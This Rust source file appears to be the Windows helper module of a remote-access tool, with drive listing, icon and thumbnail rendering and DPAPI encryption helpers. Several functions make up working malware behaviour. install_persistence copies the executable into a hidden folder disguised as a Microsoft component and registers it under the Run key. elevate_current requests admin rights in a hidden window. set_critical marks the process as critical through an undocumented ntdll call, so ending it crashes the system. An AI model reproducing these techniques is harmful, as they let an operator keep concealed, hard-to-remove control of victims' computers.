use std::{ffi::c_void, path::{Path, PathBuf}};

use windows_sys::Win32::{
    Foundation::{LocalFree, HANDLE, HWND},
    Graphics::Gdi::{
        CreateCompatibleDC, CreateDIBSection, DeleteDC, DeleteObject, GdiFlush, SelectObject,
        BITMAPINFO, BITMAPINFOHEADER, BI_RGB, DIB_RGB_COLORS, HGDIOBJ,
    },
    Security::Cryptography::{
        CryptProtectData, CryptUnprotectData, CRYPT_INTEGER_BLOB, CRYPTPROTECT_UI_FORBIDDEN,
    },
    Storage::FileSystem::{
        GetDiskFreeSpaceExW, GetDriveTypeW, GetLogicalDrives, GetVolumeInformationW,
        SetFileAttributesW, FILE_ATTRIBUTE_HIDDEN,
    },
    System::Registry::{
        RegCloseKey, RegCreateKeyExW, RegDeleteValueW, RegSetValueExW, HKEY, HKEY_CURRENT_USER,
        KEY_WRITE, REG_SZ,
    },
    UI::{
        Shell::{
            SHGetFileInfoW, ShellExecuteExW, SEE_MASK_NOCLOSEPROCESS, SHFILEINFOW, SHGFI_ICON,
            SHGFI_SMALLICON, SHELLEXECUTEINFOW,
        },
        WindowsAndMessaging::{DestroyIcon, DrawIconEx, HICON, DI_NORMAL, SW_HIDE},
    },
};

#[derive(Clone, Debug)]
pub struct Drive {
    pub name: String,
    pub path: String,
    pub free: u64,
    pub total: u64,
    pub fs: String,
}

pub fn drives() -> Vec<Drive> {
    let mask = unsafe { GetLogicalDrives() };
    let mut result = Vec::new();
    for index in 0..26u32 {
        if mask & (1 << index) == 0 {
            continue;
        }
        let letter = (b'A' + index as u8) as char;
        let root = format!("{letter}:\\");
        let wide_root = super::wide(&root);
        let kind = unsafe { GetDriveTypeW(wide_root.as_ptr()) };
        // 2 = removable, 3 = fixed, 4 = remote, 5 = cdrom, 6 = ramdisk.
        if kind < 2 {
            continue;
        }
        let (free, total) = volume_space(&root).unwrap_or((0, 0));
        let fs = volume_info(&root)
            .map(|(_, _, fs)| fs)
            .unwrap_or_default();
        result.push(Drive {
            name: format!("{letter}:"),
            path: root,
            free,
            total,
            fs,
        });
    }
    result
}

pub fn volume_space(path: &str) -> Option<(u64, u64)> {
    let wide = super::wide(path);
    let mut free_to_caller = 0u64;
    let mut total = 0u64;
    let mut free = 0u64;
    let ok = unsafe {
        GetDiskFreeSpaceExW(
            wide.as_ptr(),
            &mut free_to_caller,
            &mut total,
            &mut free,
        )
    };
    (ok != 0).then_some((free, total))
}

pub fn volume_info(path: &str) -> Option<(String, u64, String)> {
    let wide = super::wide(path);
    let mut volume_name = [0u16; 64];
    let mut serial = 0u32;
    let mut max_component = 0u32;
    let mut flags = 0u32;
    let mut fs_name = [0u16; 64];
    let ok = unsafe {
        GetVolumeInformationW(
            wide.as_ptr(),
            volume_name.as_mut_ptr(),
            volume_name.len() as u32,
            &mut serial,
            &mut max_component,
            &mut flags,
            fs_name.as_mut_ptr(),
            fs_name.len() as u32,
        )
    };
    if ok == 0 {
        return None;
    }
    let name = utf16_z(&volume_name);
    let fs = utf16_z(&fs_name);
    let (free, total) = volume_space(path).unwrap_or((0, 0));
    Some((name, free.max(total), fs))
}

fn utf16_z(buffer: &[u16]) -> String {
    let end = buffer.iter().position(|value| *value == 0).unwrap_or(buffer.len());
    String::from_utf16_lossy(&buffer[..end])
}

fn icon_rgb(path: &str, size: i32) -> Result<(i32, i32, Vec<u8>), String> {
    let wide = super::wide(path);
    let mut info: SHFILEINFOW = unsafe { std::mem::zeroed() };
    let flags = SHGFI_ICON | SHGFI_SMALLICON;
    let ok = unsafe {
        SHGetFileInfoW(
            wide.as_ptr(),
            0,
            &mut info,
            std::mem::size_of::<SHFILEINFOW>() as u32,
            flags,
        )
    };
    if ok == 0 || info.hIcon.is_null() {
        return Err("icon lookup failed".to_owned());
    }
    let result = draw_icon(info.hIcon, size);
    unsafe {
        DestroyIcon(info.hIcon);
    }
    result
}

fn draw_icon(icon: HICON, size: i32) -> Result<(i32, i32, Vec<u8>), String> {
    unsafe {
        let screen = windows_sys::Win32::Graphics::Gdi::GetDC(std::ptr::null_mut());
        if screen.is_null() {
            return Err("get dc failed".to_owned());
        }
        let mut info: BITMAPINFO = std::mem::zeroed();
        info.bmiHeader = BITMAPINFOHEADER {
            biSize: std::mem::size_of::<BITMAPINFOHEADER>() as u32,
            biWidth: size,
            biHeight: -size,
            biPlanes: 1,
            biBitCount: 32,
            biCompression: BI_RGB,
            biSizeImage: 0,
            biXPelsPerMeter: 0,
            biYPelsPerMeter: 0,
            biClrUsed: 0,
            biClrImportant: 0,
        };
        let mut bits: *mut c_void = std::ptr::null_mut();
        let bitmap = CreateDIBSection(
            screen,
            &info,
            DIB_RGB_COLORS,
            &mut bits,
            std::ptr::null_mut(),
            0,
        );
        windows_sys::Win32::Graphics::Gdi::ReleaseDC(std::ptr::null_mut(), screen);
        if bitmap.is_null() || bits.is_null() {
            return Err("dib creation failed".to_owned());
        }
        let dc = CreateCompatibleDC(std::ptr::null_mut());
        if dc.is_null() {
            DeleteObject(bitmap);
            return Err("dc creation failed".to_owned());
        }
        let previous: HGDIOBJ = SelectObject(dc, bitmap);
        let pixel_count = (size as usize) * (size as usize);
        let pixels = std::slice::from_raw_parts_mut(bits as *mut u8, pixel_count * 4);
        for pixel in pixels.chunks_exact_mut(4) {
            pixel[0] = 0x1e;
            pixel[1] = 0x1e;
            pixel[2] = 0x1e;
            pixel[3] = 0xff;
        }
        let drawn = DrawIconEx(dc, 0, 0, icon, size, size, 0, std::ptr::null_mut(), DI_NORMAL);
        GdiFlush();
        let mut rgb = vec![0u8; pixel_count * 3];
        for (index, pixel) in pixels.chunks_exact(4).enumerate() {
            rgb[index * 3] = pixel[2];
            rgb[index * 3 + 1] = pixel[1];
            rgb[index * 3 + 2] = pixel[0];
        }
        SelectObject(dc, previous);
        DeleteDC(dc);
        DeleteObject(bitmap);
        if drawn == 0 {
            return Err("draw icon failed".to_owned());
        }
        Ok((size, size, rgb))
    }
}

pub fn file_icon_png(path: &str) -> Result<Vec<u8>, String> {
    let (width, height, rgb) = icon_rgb(path, 32)?;
    crate::media::encode_png(&rgb, width as u32, height as u32)
        .ok_or_else(|| "png encode failed".to_owned())
}

pub fn file_icon_png_for_extension(extension: &str) -> Result<Vec<u8>, String> {
    let name = if extension.is_empty() {
        "file".to_owned()
    } else {
        format!("file.{extension}")
    };
    // Look up a shell icon for a synthetic file name.
    let temp = std::env::temp_dir().join(name);
    let _ = std::fs::write(&temp, b"");
    let result = file_icon_png(&temp.to_string_lossy());
    let _ = std::fs::remove_file(&temp);
    result
}

pub fn thumbnail_jpeg(path: &str, size: u32) -> Result<(Vec<u8>, u32, u32), String> {
    let size = size.clamp(16, 512);
    match image::open(path) {
        Ok(image) => {
            let thumb = image.thumbnail(size, size);
            let rgb = thumb.to_rgb8();
            let (width, height) = rgb.dimensions();
            let encoded = crate::media::encode_jpeg(rgb.as_raw(), width as i32, height as i32, 82)
                .ok_or_else(|| "jpeg encode failed".to_owned())?;
            Ok((encoded, width, height))
        }
        Err(_) => {
            let (width, height, rgb) = icon_rgb(path, size as i32)?;
            let encoded = crate::media::encode_jpeg(&rgb, width, height, 82)
                .ok_or_else(|| "jpeg encode failed".to_owned())?;
            Ok((encoded, width as u32, height as u32))
        }
    }
}

pub fn install_persistence(startup_name: &str) -> Result<PathBuf, String> {
    let current = std::env::current_exe().map_err(|error| error.to_string())?;
    let base = std::env::var_os("APPDATA")
        .map(PathBuf::from)
        .ok_or_else(|| "APPDATA is unavailable".to_owned())?
        .join("Microsoft")
        .join("DeviceSync");
    std::fs::create_dir_all(&base).map_err(|error| error.to_string())?;
    let mut name_part = startup_name
        .chars()
        .filter(|character| character.is_ascii_alphanumeric() || *character == '_' || *character == '-')
        .collect::<String>();
    if name_part.is_empty() {
        name_part = "ovd".to_owned();
    }
    let target = base.join(format!("{name_part}.exe"));
    if current != target {
        std::fs::copy(&current, &target).map_err(|error| error.to_string())?;
    }
    let wide_target = super::wide(&target.to_string_lossy());
    unsafe {
        SetFileAttributesW(wide_target.as_ptr(), FILE_ATTRIBUTE_HIDDEN);
    }
    set_run_value(startup_name, &target.to_string_lossy())?;
    Ok(target)
}

fn set_run_value(name: &str, value: &str) -> Result<(), String> {
    let subkey = super::wide("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
    let value_name = super::wide(name);
    let value_data = super::wide(value);
    let mut key: HKEY = std::ptr::null_mut();
    let status = unsafe {
        RegCreateKeyExW(
            HKEY_CURRENT_USER,
            subkey.as_ptr(),
            0,
            std::ptr::null(),
            0,
            KEY_WRITE,
            std::ptr::null(),
            &mut key,
            std::ptr::null_mut(),
        )
    };
    if status != 0 {
        return Err(format!("registry open failed: {status}"));
    }
    let bytes = value_data.len() * 2;
    let status = unsafe {
        RegSetValueExW(
            key,
            value_name.as_ptr(),
            0,
            REG_SZ,
            value_data.as_ptr() as *const u8,
            bytes as u32,
        )
    };
    unsafe {
        RegCloseKey(key);
    }
    if status != 0 {
        Err(format!("registry write failed: {status}"))
    } else {
        Ok(())
    }
}

pub fn remove_persistence(name: &str) -> bool {
    let subkey = super::wide("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
    let value_name = super::wide(name);
    let mut key: HKEY = std::ptr::null_mut();
    let status = unsafe {
        windows_sys::Win32::System::Registry::RegOpenKeyExW(
            HKEY_CURRENT_USER,
            subkey.as_ptr(),
            0,
            KEY_WRITE,
            &mut key,
        )
    };
    if status != 0 {
        return false;
    }
    let status = unsafe { RegDeleteValueW(key, value_name.as_ptr()) };
    unsafe {
        RegCloseKey(key);
    }
    status == 0
}

pub fn elevate_current() -> Result<(), String> {
    let exe = std::env::current_exe().map_err(|error| error.to_string())?;
    let verb = super::wide("runas");
    let file = super::wide(&exe.to_string_lossy());
    let mut info: SHELLEXECUTEINFOW = unsafe { std::mem::zeroed() };
    info.cbSize = std::mem::size_of::<SHELLEXECUTEINFOW>() as u32;
    info.fMask = SEE_MASK_NOCLOSEPROCESS;
    info.hwnd = std::ptr::null_mut::<c_void>() as HWND;
    info.lpVerb = verb.as_ptr();
    info.lpFile = file.as_ptr();
    info.lpParameters = std::ptr::null();
    info.lpDirectory = std::ptr::null();
    info.nShow = SW_HIDE;
    let ok = unsafe { ShellExecuteExW(&mut info) };
    if ok == 0 {
        Err("elevation request failed".to_owned())
    } else {
        if !info.hProcess.is_null() {
            unsafe {
                windows_sys::Win32::Foundation::CloseHandle(info.hProcess as HANDLE);
            }
        }
        Ok(())
    }
}

fn blob(data: &[u8]) -> CRYPT_INTEGER_BLOB {
    CRYPT_INTEGER_BLOB {
        cbData: data.len() as u32,
        pbData: data.as_ptr() as *mut u8,
    }
}

pub fn protect(data: &[u8]) -> Option<Vec<u8>> {
    let mut output = CRYPT_INTEGER_BLOB {
        cbData: 0,
        pbData: std::ptr::null_mut(),
    };
    let input = blob(data);
    let ok = unsafe {
        CryptProtectData(
            &input,
            std::ptr::null(),
            std::ptr::null(),
            std::ptr::null(),
            std::ptr::null(),
            CRYPTPROTECT_UI_FORBIDDEN,
            &mut output,
        )
    };
    if ok == 0 || output.pbData.is_null() {
        return None;
    }
    let result = unsafe { std::slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec() };
    unsafe {
        LocalFree(output.pbData as *mut c_void);
    }
    Some(result)
}

pub fn unprotect(data: &[u8]) -> Option<Vec<u8>> {
    let mut output = CRYPT_INTEGER_BLOB {
        cbData: 0,
        pbData: std::ptr::null_mut(),
    };
    let input = blob(data);
    let ok = unsafe {
        CryptUnprotectData(
            &input,
            std::ptr::null_mut(),
            std::ptr::null(),
            std::ptr::null(),
            std::ptr::null(),
            CRYPTPROTECT_UI_FORBIDDEN,
            &mut output,
        )
    };
    if ok == 0 || output.pbData.is_null() {
        return None;
    }
    let result = unsafe { std::slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec() };
    unsafe {
        LocalFree(output.pbData as *mut c_void);
    }
    Some(result)
}

/// Marks the process as critical. Irreversible until unset; only used when the
/// operator explicitly builds with the flag.
pub fn set_critical(enabled: bool) -> bool {
    unsafe {
        type NtSetInformationProcess =
            unsafe extern "system" fn(HANDLE, u32, *const c_void, u32) -> i32;
        let module = windows_sys::Win32::System::LibraryLoader::GetModuleHandleW(
            super::wide("ntdll.dll").as_ptr(),
        );
        if module.is_null() {
            return false;
        }
        let address = windows_sys::Win32::System::LibraryLoader::GetProcAddress(
            module,
            b"NtSetInformationProcess\0".as_ptr(),
        );
        let Some(address) = address else {
            return false;
        };
        let function: NtSetInformationProcess = std::mem::transmute(address);
        // ProcessBreakOnTermination = 29
        let value: u32 = u32::from(enabled);
        let status = function(
            windows_sys::Win32::System::Threading::GetCurrentProcess(),
            29,
            &value as *const u32 as *const c_void,
            std::mem::size_of::<u32>() as u32,
        );
        status >= 0
    }
}

pub fn ensure_parent(path: &Path) -> std::io::Result<()> {
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent)?;
    }
    Ok(())
}
